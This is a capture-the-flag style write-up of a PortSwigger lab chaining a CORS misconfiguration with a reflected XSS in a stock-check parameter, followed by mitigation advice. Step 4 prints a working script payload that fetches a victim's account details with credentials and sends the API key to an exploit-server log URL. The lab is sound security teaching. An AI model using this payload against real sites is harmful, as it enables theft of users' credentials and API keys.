# Lab Completion Write-Up: Exploiting CORS and XSS Vulnerabilities

## Steps to Complete the Lab

### 1. Login and Observe Behavior
- Ensure that intercept is turned off in Burp Suite.
- Use Burp's browser to log in and access the account page.
- Observe the HTTP request history. Note that your API key is retrieved via an AJAX request to `/accountDetails`.
- The server response includes the `Access-Control-Allow-Credentials` header, suggesting support for CORS (Cross-Origin Resource Sharing).

### 2. Test CORS Configuration
- Send the AJAX request to `/accountDetails` to Burp Repeater.
- Modify the request by adding the `Origin` header:
  ```
  Origin: http://subdomain.lab-id
  ```
  Replace `lab-id` with the lab domain name.
- Resubmit the request and observe the response.
- Confirm that the `Access-Control-Allow-Origin` header reflects the `Origin` header value.
  - This indicates that the server allows cross-origin access from arbitrary subdomains (both HTTP and HTTPS).

### 3. Analyze the XSS Vulnerability
- Open any product page in the browser.
- Click on the "Check stock" button and observe that the stock checking functionality uses an HTTP URL on a subdomain.
- Identify that the `productId` parameter is vulnerable to Cross-Site Scripting (XSS).

![Basic Origin Reflection Attack Lab 3](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab3a.PNG)

### 4. Craft the Exploit Payload
- Go to the exploit server.
- Input the following HTML payload, replacing `YOUR-LAB-ID` with your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with your exploit server ID:
  ```html
  <script>
      document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+this.responseText; };%3c/script>&storeId=1"
  </script>
  ```
Final POC
![Basic Origin Reflection Attack Lab 3](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab3d.PNG)

### 5. Test the Exploit
- Click "View exploit" on the exploit server.
- Observe the behavior:
  - You are redirected to the attacker's server (`https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log`).
  - The URL contains your API key as a query parameter.

### 6. Deliver the Exploit to the Victim
- On the exploit server, click "Deliver exploit to victim."
- Wait for the victim to access the malicious page.
- Click "Access log" to retrieve the victim's API key.

Got the Admin's API key
![Basic Origin Reflection Attack Lab 3](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab3e.PNG)

### 7. Submit the API Key
- Copy the victim's API key from the exploit server logs.
- Submit the key to the lab interface to complete the lab.

Submitting....
![Basic Origin Reflection Attack Lab 3](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab3c.PNG)

Solved 😎👌
![Basic Origin Reflection Attack Lab 3](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab3b.PNG)

## Key Points Demonstrated

1. **Exploitation of CORS Misconfiguration**:
   - The lab demonstrates how an insecure CORS configuration can allow unauthorized access to sensitive resources.
   - The server erroneously trusts subdomains by reflecting the `Origin` header in the `Access-Control-Allow-Origin` response.

2. **Exploitation of XSS Vulnerability**:
   - The `productId` parameter in the stock-checking functionality is vulnerable to script injection.
   - The injected script retrieves sensitive data (API key) and exfiltrates it to the attacker's server.

3. **Chaining Vulnerabilities**:
   - The lab showcases how multiple vulnerabilities (CORS misconfiguration and XSS) can be chained to escalate an attack.

## Recommendations
- **Restrict CORS Access**:
  - Only allow trusted origins in the `Access-Control-Allow-Origin` header.
  - Avoid reflecting arbitrary subdomains in responses.

- **Sanitize Inputs**:
  - Validate and sanitize all user inputs to prevent script injection.

- **Use Secure Cookies**:
  - Set cookies with the `HttpOnly` and `Secure` flags to prevent unauthorized access via JavaScript and ensure transmission over HTTPS only.

- **Implement Content Security Policies (CSP)**:
  - Enforce a restrictive CSP to limit the execution of inline scripts and external script sources.

By following these steps and applying the recommendations, you can effectively identify, exploit, and mitigate vulnerabilities in web applications.

